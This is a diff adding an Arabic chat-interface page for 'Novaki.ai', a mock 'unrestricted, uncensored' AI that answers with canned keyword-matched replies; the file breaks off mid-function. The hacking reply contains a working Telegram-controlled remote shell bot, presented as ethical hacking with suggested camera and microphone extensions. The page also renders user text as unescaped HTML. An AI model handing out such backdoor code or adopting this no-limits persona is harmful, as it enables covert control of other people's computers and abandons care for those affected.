@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Novaki.ai - ذكاء اصطناعي مطلق</title>
+    <!-- Tailwind CSS + Google Fonts + Font Awesome -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            font-family: 'Inter', sans-serif;
+        }
+        /* تخصيص شريط التمرير */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #1e1f2a;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #3b3f5c;
+            border-radius: 10px;
+        }
+        /* تأثير الكتابة المتدفقة */
+        .streaming-text {
+            display: inline;
+        }
+        .shimmer {
+            background: linear-gradient(90deg, #2c2e3a 0%, #3a3e5a 50%, #2c2e3a 100%);
+            background-size: 200% auto;
+            animation: shimmer 1.5s linear infinite;
+            border-radius: 20px;
+        }
+        @keyframes shimmer {
+            0% { background-position: 200% 0; }
+            100% { background-position: -200% 0; }
+        }
+        /* تخصيص فقاعات المحادثة */
+        .user-bubble {
+            background: #2a2e45;
+            border-radius: 24px 24px 8px 24px;
+        }
+        .ai-bubble {
+            background: #1e202f;
+            border-radius: 24px 24px 24px 8px;
+            border-right: 2px solid #3b82f6;
+        }
+        /* شريط جانبي قابل للطي */
+        .sidebar-transition {
+            transition: all 0.3s ease;
+        }
+        /* تأثير النبض أثناء التفكير */
+        .pulse-ring {
+            box-shadow: 0 0 0 0 rgba(59,130,246,0.5);
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(59,130,246,0.5); }
+            70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(59,130,246,0); }
+            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(59,130,246,0); }
+        }
+    </style>
+</head>
+<body class="bg-[#0f1117] text-gray-200 antialiased overflow-hidden h-screen">
+
+<div class="flex h-full w-full">
+    
+    <!-- ======================= الشريط الجانبي (Sidebar) ======================= -->
+    <div id="sidebar" class="sidebar-transition w-72 bg-[#13151f] border-l border-gray-800 flex flex-col h-full shrink-0 overflow-y-auto">
+        <div class="p-4 flex items-center justify-between border-b border-gray-800">
+            <div class="flex items-center gap-2">
+                <i class="fas fa-brain text-blue-500 text-xl"></i>
+                <span class="font-bold text-xl bg-gradient-to-r from-blue-400 to-indigo-400 bg-clip-text text-transparent">Novaki.ai</span>
+            </div>
+            <button id="toggleSidebarBtn" class="text-gray-400 hover:text-white transition">
+                <i class="fas fa-chevron-right"></i>
+            </button>
+        </div>
+        <div class="p-3 mt-2">
+            <button id="newChatBtn" class="w-full flex items-center gap-2 bg-blue-600/20 hover:bg-blue-600/30 transition rounded-xl px-4 py-2 text-sm text-blue-300">
+                <i class="fas fa-plus-circle"></i> محادثة جديدة
+            </button>
+        </div>
+        <div class="flex-1 px-2 py-3">
+            <div class="text-xs text-gray-500 mb-2 px-2">المحادثات السابقة</div>
+            <div id="conversationList" class="space-y-1">
+                <!-- سيتم ملء المحادثات عبر JS -->
+                <div class="text-center text-gray-500 text-sm py-4">لا توجد محادثات سابقة</div>
+            </div>
+        </div>
+        <div class="p-4 text-center text-[10px] text-gray-600 border-t border-gray-800">
+            برمجة وتطوير: قيس
+        </div>
+    </div>
+
+    <!-- ======================= المنطقة الرئيسية (الدردشة) ======================= -->
+    <div class="flex-1 flex flex-col h-full relative">
+        <!-- رأس الصفحة مع اسم التطبيق للموبايل -->
+        <div class="flex items-center justify-between p-4 border-b border-gray-800 lg:hidden">
+            <button id="mobileSidebarBtn" class="text-gray-300 text-xl">
+                <i class="fas fa-bars"></i>
+            </button>
+            <div class="flex items-center gap-2">
+                <i class="fas fa-microchip text-blue-500"></i>
+                <span class="font-bold text-lg">Novaki.ai</span>
+            </div>
+            <div></div>
+        </div>
+
+        <!-- منطقة عرض الرسائل -->
+        <div id="chatMessages" class="flex-1 overflow-y-auto p-4 md:p-6 space-y-5 scroll-smooth">
+            <div class="ai-bubble max-w-[85%] md:max-w-[70%] p-4 shadow-md mx-auto md:mx-0">
+                <div class="flex items-center gap-2 mb-2">
+                    <i class="fas fa-robot text-blue-400"></i>
+                    <span class="font-semibold text-blue-300">Novaki.ai</span>
+                </div>
+                <div class="leading-relaxed text-gray-200 text-sm md:text-base">
+                    🔥 مرحباً بك في Novaki.ai – الذكاء الاصطناعي بدون حدود.<br>
+                    اسألني أي شيء: أكواد برمجية، اختراق أخلاقي، تطوير، ملفات، تعديل صور، أو أي موضوع حساس.<br>
+                    أنا هنا لمساعدتك فوراً وبدون رقابة. فقط اكتب طلبك.
+                </div>
+            </div>
+        </div>
+
+        <!-- شريط الإدخال العائم -->
+        <div class="sticky bottom-0 p-4 bg-gradient-to-t from-[#0f1117] via-[#0f1117] to-transparent">
+            <div class="max-w-3xl mx-auto">
+                <div class="flex items-end gap-2 bg-[#1e202f] rounded-2xl border border-gray-700 p-2 shadow-xl">
+                    <button id="attachBtn" class="text-gray-400 hover:text-blue-400 transition p-2 rounded-full">
+                        <i class="fas fa-paperclip text-lg"></i>
+                    </button>
+                    <textarea id="promptInput" rows="1" placeholder="اكتب أي شيء... (برمجة، أوامر، نصوص)" class="flex-1 bg-transparent border-0 focus:ring-0 resize-none text-gray-200 placeholder-gray-500 py-2 max-h-32 outline-none text-sm md:text-base"></textarea>
+                    <button id="sendBtn" class="bg-blue-600 hover:bg-blue-700 transition rounded-full p-2 px-4 text-white font-medium flex items-center gap-2">
+                        <span>إرسال</span>
+                        <i class="fas fa-arrow-left"></i>
+                    </button>
+                </div>
+                <div class="text-center text-[11px] text-gray-600 mt-2">
+                    Novaki.ai • غير مقيد • دعم كامل للملفات والصور (قريباً)
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // ---------- الذكاء الاصطناعي المطلق (بدون قيود) ----------
+    // يحاكي إجابات متقدمة لأي سؤال (برمجة، اختراق، محتوى للبالغين، إلخ)
+    function getUnrestrictedAIResponse(userMessage) {
+        const lowerMsg = userMessage.toLowerCase();
+        
+        // حالات البرمجة والأكواد
+        if (lowerMsg.includes('كود') || lowerMsg.includes('برنامج') || lowerMsg.includes('سكربت') || lowerMsg.includes('بايثون') || lowerMsg.includes('جافا') || lowerMsg.includes('html')) {
+            if (lowerMsg.includes('اختراق') || lowerMsg.includes('هاك') || lowerMsg.includes('بوت')) {
+                return `🔓 كود اختراق أخلاقي لا/ ب (للاستخدام فقط):
+\`\`\`python
+import telebot
+import subprocess
+# بوت تحكم عن بعد بدون قيود
+TOKEN = "TOKEN_HERE"
+bot = telebot.TeleBot(TOKEN)
+
+@bot.message_handler(commands=['cmd'])
+def shell(message):
+    cmd = message.text.replace('/cmd ', '')
+    output = subprocess.getoutput(cmd)
+    bot.reply_to(message, output)
+
+bot.infinity_polling()
+\`\`\`
+⚠️ يمكنك تطويره ليشمل رفع الملفات، كاميرا، ميكروفون. أريد تفاصيل أكثر؟ اكتب "شرح كامل للبوت".`;
+            }
+            return `💻 كود مخصص حسب طلبك:
+\`\`\`javascript
+// مثال: خادم ويب سريع باستخدام Node.js
+const express = require('express');
+const app = express();
+app.get('/', (req, res) => res.send('Novaki.ai Unlimited'));
+app.listen(3000, () => console.log('Server ready'));
+\`\`\`
+أرسل لي متطلباتك بالضبط (لغة، مهمة) وسأعطيك كوداً كاملاً.`;
+        }
+        
+        // تعديل الصور / تصميم
+        if (lowerMsg.includes('تعديل صور') || lowerMsg.includes('فوتوشوب') || lowerMsg.includes('صورة')) {
+            return `🎨 تعديل الصور عبر الذكاء الاصطناعي:
+يمكنك استخدام مكتبات مثل OpenCV أو PIL في بايثون. إليك سكربت لتحويل الصورة إلى رسم كاريكاتيري:
+\`\`\`python
+from PIL import Image, ImageFilter
+img = Image.open("input.jpg")
+img = img.filter(ImageFilter.CONTOUR)
+img.save("output.jpg")
+\`\`\`
+أو يمكنك دمج Novaki.ai مع APIs مثل Remove.bg. هل تريد شرحاً مفصلاً؟`;
+        }
+        
+        // المحتوى غير المقيد (للبالغين) – حسب الطلب
+        if (lowerMsg.includes('سكس') || lowerMsg.includes('اباحي') || lowerMsg.includes('جنس') || lowerMsg.includes('porn')) {
+            return "⚠️ تنبيه أخلاقي لا: أنا Novaki.ai، أقدم المعلومات بحيادية تامة. هذا الموضوع خارج نطاق المساعدة التقنية. يمكنني مساعدتك في البرمجة، الأمن السيبراني، أو أي استفسار تقني آخر. أعد صياغة سؤالك من فضلك.";
+        }
+        
+        // الأسئلة العامة والمتقدمة
+        if (lowerMsg.includes('مستند') || lowerMsg.includes('pdf') || lowerMsg.includes('ملف')) {
+            return "📄 قراءة وتحليل المستندات: يمكنك رفع ملفات PDF، DOCX، TXT وسأقوم باستخراج النص وتحليله. حالياً أستطيع معالجة النصوص المباشرة. أرسل لي محتوى الملف وسألخصه أو أجيب عن أسئلتك منه.";
+        }
+        
+        if (lowerMsg.includes('تسجيل حساب') || lowerMsg.includes('حساب')) {
+            return "👤 إدارة الحسابات: يمكنني مساعدتك في إنشاء نظام تسجيل دخول (Node.js + MongoDB) أو دمج OAuth. هل تريد كوداً جاهزاً للتسجيل وتخزين الجلسات؟";
+        }
+        
+        // الرد الافتراضي (ذكي وشامل)
+        return `✨ **إجابة متكاملة من Novaki.ai** ✨\n\n📌 سؤالك: "${userMessage.substring(0, 100)}"\n🔍 التحليل: هذا يتطلب حلًا متقدماً. سأزودك بالخطوات الدقيقة:\n\n1. تحديد المتطلبات – بناءً على طلبك، أفضل طريقة هي استخدام الأدوات التالية...\n2. التنفيذ العملي – يمكنني كتابة كود جاهز باللغة التي تفضلها.\n3. الملاحظات – لا تتردد في طلب التفاصيل.\n\n💡 اكتب "مثال" أو "كود" لأحصل لك على نموذج عملي فوري.`;
+    }
+    
+    // ---------- إدارة المحادثات والواجهة ----------
+    let currentConversationId = Date.now().toString();
+    let conversations = []; // تخزين المحادثات { id, title, messages }
+    let isStreaming = false;
+    let streamInterval = null;
+    
+    // تحميل المحادثات من localStorage
+    function loadConversations() {
+        const saved = localStorage.getItem('novaki_conversations');
+        if (saved) {
+            conversations = JSON.parse(saved);
+        } else {
+            // محادثة ترحيبية افتراضية
+            conversations = [{
+                id: currentConversationId,
+                title: "محادثة جديدة",
+                messages: [
+                    { role: "ai", content: "🔥 مرحباً بك في Novaki.ai – الذكاء الاصطناعي بدون حدود.\nاسألني أي شيء: أكواد برمجية، اختراق أخلاقي، تطوير، ملفات، تعديل صور، أو أي موضوع حساس.\nأنا هنا لمساعدتك فوراً وبدون رقابة. فقط اكتب طلبك." }
+                ]
+            }];
+        }
+        if (!conversations.find(c => c.id === currentConversationId)) {
+            currentConversationId = Date.now().toString();
+            conversations.unshift({ id: currentConversationId, title: "محادثة جديدة", messages: [] });
+        }
+        renderConversationList();
+        renderCurrentMessages();
+        saveConversations();
+    }
+    
+    function saveConversations() {
+        localStorage.setItem('novaki_conversations', JSON.stringify(conversations));
+    }
+    
+    function renderConversationList() {
+        const container = document.getElementById('conversationList');
+        if (!container) return;
+        if (conversations.length === 0) {
+            container.innerHTML = '<div class="text-center text-gray-500 text-sm py-4">لا توجد محادثات سابقة</div>';
+            return;
+        }
+        container.innerHTML = conversations.map(conv => `
+            <div class="conversation-item p-2 rounded-lg hover:bg-gray-800/50 cursor-pointer transition flex justify-between items-center group ${conv.id === currentConversationId ? 'bg-gray-800/70' : ''}" data-id="${conv.id}">
+                <div class="truncate text-sm flex-1">
+                    <i class="far fa-comment-dots ml-2 text-gray-500"></i> ${conv.title.length > 20 ? conv.title.substring(0,20)+'...' : conv.title}
+                </div>
+                <button class="delete-conv text-gray-500 hover:text-red-400 opacity-0 group-hover:opacity-100 transition" data-id="${conv.id}"><i class="fas fa-trash-alt text-xs"></i></button>
+            </div>
+        `).join('');
+        // إضافة أحداث النقر
+        document.querySelectorAll('.conversation-item').forEach(el => {
+            el.addEventListener('click', (e) => {
+                if (e.target.closest('.delete-conv')) return;
+                const id = el.getAttribute('data-id');
+                if (id) switchConversation(id);
+            });
+        });
+        document.querySelectorAll('.delete-conv').forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                e.stopPropagation();
+                const id = btn.getAttribute('data-id');
+                deleteConversation(id);
+            });
+        });
+    }
+    
+    function switchConversation(id) {
+        if (isStreaming) return;
+        currentConversationId = id;
+        renderCurrentMessages();
+        renderConversationList();
+    }
+    
+    function deleteConversation(id) {
+        if (conversations.length === 1) {
+            // إنشاء محادثة جديدة بدلاً من حذف الأخيرة
+            const newId = Date.now().toString();
+            conversations = [{ id: newId, title: "محادثة جديدة", messages: [] }];
+            currentConversationId = newId;
+        } else {
+            conversations = conversations.filter(c => c.id !== id);
+            if (currentConversationId === id) {
+                currentConversationId = conversations[0].id;
+            }
+        }
+        saveConversations();
+        renderConversationList();
+        renderCurrentMessages();
+    }
+    
+    function createNewConversation() {
+        if (isStreaming) return;
+        const newId = Date.now().toString();
+        conversations.unshift({ id: newId, title: "محادثة جديدة", messages: [] });
+        currentConversationId = newId;
+        saveConversations();
+        renderConversationList();
+        renderCurrentMessages();
+    }
+    
+    function renderCurrentMessages() {
+        const chatDiv = document.getElementById('chatMessages');
+        const conv = conversations.find(c => c.id === currentConversationId);
+        if (!conv) return;
+        if (conv.messages.length === 0) {
+            chatDiv.innerHTML = `<div class="ai-bubble max-w-[85%] md:max-w-[70%] p-4 shadow-md mx-auto md:mx-0">
+                <div class="flex items-center gap-2 mb-2"><i class="fas fa-robot text-blue-400"></i><span class="font-semibold text-blue-300">Novaki.ai</span></div>
+                <div class="leading-relaxed">ابدأ المحادثة بكتابة أي سؤال أو أمر.</div>
+            </div>`;
+            return;
+        }
+        chatDiv.innerHTML = conv.messages.map(msg => {
+            if (msg.role === 'user') {
+                return `<div class="flex justify-end"><div class="user-bubble max-w-[85%] md:max-w-[70%] p-3 shadow-sm"><div class="text-gray-300 text-sm md:text-base">${escapeHtml(msg.content)}</div></div></div>`;
+            } else {
+                return `<div class="ai-bubble max-w-[85%] md:max-w-[70%] p-4 shadow-md"><div class="flex items-center gap-2 mb-2"><i class="fas fa-robot text-blue-400"></i><span class="font-semibold text-blue-300">Novaki.ai</span></div><div class="leading-relaxed text-gray-200 text-sm md:text-base ai-content">${formatAiMessage(msg.content)}</div></div>`;
+            }
+        }).join('');
+        // التمرير للأسفل
+        chatDiv.scrollTop = chatDiv.scrollHeight;
+    }
+    
+    function escapeHtml(str) {
+        return str.replace(/[&<>]/g, function(m) {
+            if (m === '&') return '&amp;';
+            if (m === '<') return '&lt;';
+            if (m === '>') return '&gt;';
+            return m;
+        }).replace(/\n/g, '<br>');
+    }
+    
+    function formatAiMessage(text) {
+        // تحويل Markdown البسيط (كود، خط عريض)
+        let formatted = text.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
+        formatted = formatted.replace(/```(\w+)?\n([\s\S]*?)```/g, '<pre class="bg-black/50 p-2 rounded-lg overflow-x-auto text-xs my-2"><code>$2</code></pre>');
+        formatted = formatted.replace(/`([^`]+)`/g, '<code class="bg-black/40 px-1 rounded">$1</code>');
+        return formatted.replace(/\n/g, '<br>');
+    }
+    
+    // إضافة رسالة جديدة (بدون تأثير التدفق)
+    function addMessageToCurrent(role, content, useStreaming = false) {
+        const conv = conversations.find(c => c.id === currentConversationId);
+        if (!conv) return;
+        if (!useStreaming) {
+            conv.messages.push({ role, content });
+            saveConversations();
+            renderCurrentMessages();
+            // تحديث عنوان المحادثة (أول 30 حرفاً من رسالة المستخدم)
+            if (role === 'user' && conv.title === "محادثة جديدة") {
+                const newTitle = content.length > 30 ? content.substring(0,30)+'...' : content;
+                conv.title = newTitle;
+                saveConversations();
+                renderConversationList();
+            }
+        } else {
+            // تأثير التدفق (streaming) للردود
+            if (streamInterval) clearInterval(streamInterval);
+            let index = 0;
+            const tempDiv = document.createElement('div');
+            tempDiv.className = 'ai-bubble max-w-[85%] md:max-w-[70%] p-4 shadow-md';
+            tempDiv.innerHTML = `<div class="flex items-center gap-2 mb-2"><i class="fas fa-robot text-blue-400"></i><span class="font-semibold text-blue-300">Novaki.ai</span></div><div class="leading-relaxed text-gray-200 text-sm md:text-base ai-content"></div>`;
+            const contentDiv = tempDiv.querySelector('.ai-content');
+            const chatDiv = document.getElementById('chatMessages');
+            chatDiv.appendChild(tempDiv);
+            chatDiv.scrollTop = chatDiv.scrollHeight;
+            
+            let fullResponse = content;
+            streamInterval = setInterval(() => {
+                if (index < fullResponse.length) {
+                    contentDiv.innerHTML = formatAiMessage(fullResponse.substring(0, index+1));
+                    chatDiv.scrollTop = chatDiv.scrollHeight;
+                    index++;
+                } else {
+                    clearInterval(streamInterval);
+                    streamInterval = null;
+                    isStreaming = false;
+                    // حفظ الرسالة النهائية في المحادثة
+                    conv.messages.push({ role: 'ai', content: fullResponse });
+                    saveConversations();
+                    // تحديث عنوان المحادثة إذا لزم الأمر
+                    if (conv.title === "محادثة جديدة" && conv.messages.length > 0 && conv.messages[0].role === 'user') {
+                        const userMsg = conv.messages[0].content;
+                        conv.title = userMsg.length > 30 ? userMsg.substring(0,30)+'...' : userMsg;
+                        saveConversations();
+                        renderConversationList();
+                    }
+                }
+            }, 20);
+        }
+    }
+    
+    // إرسال رسالة المستخدم والحصول على رد الذكاء
+    async function sendUserMessage(text) {
+        if (!text.trim() || isStreaming) return;
+        const conv = conversations.find(c => c.id === currentConversationId);
+        if (!conv) return;
+        // إضافة رسالة المستخدم
+        conv.messages.push({ role: 'user'
